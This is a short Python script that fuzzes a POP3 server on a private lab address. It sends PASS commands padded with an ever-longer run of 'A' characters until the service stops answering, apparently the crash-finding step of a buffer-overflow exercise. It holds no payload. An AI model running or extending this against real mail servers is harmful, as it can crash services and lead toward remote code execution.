#!/usr/bin/python3

import socket
from time import sleep

# consts
IP = '192.168.56.102'
PORT = 110

buffer = 100 * 'A'

while True:
    try:
        # Connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))

        # Send Username
        welcome = s.recv(1024)
        username = b'USER Aviv' + b'\r\n'
        s.send(username)

        # Send Password
        greet_user = s.recv(1024)
        password = b'PASS ' + buffer.encode() +  b'\r\n'

        print(f'Attempting to send {len(buffer)} bytes.')
        s.send(password)

        # Didn't crash
        _quit = b'QUIT\r\n'
        s.send(_quit)
        s.close()
        
        # Increase buffer size
        buffer += 200 * 'A'

    except Exception as e:
        print(e)
        exit()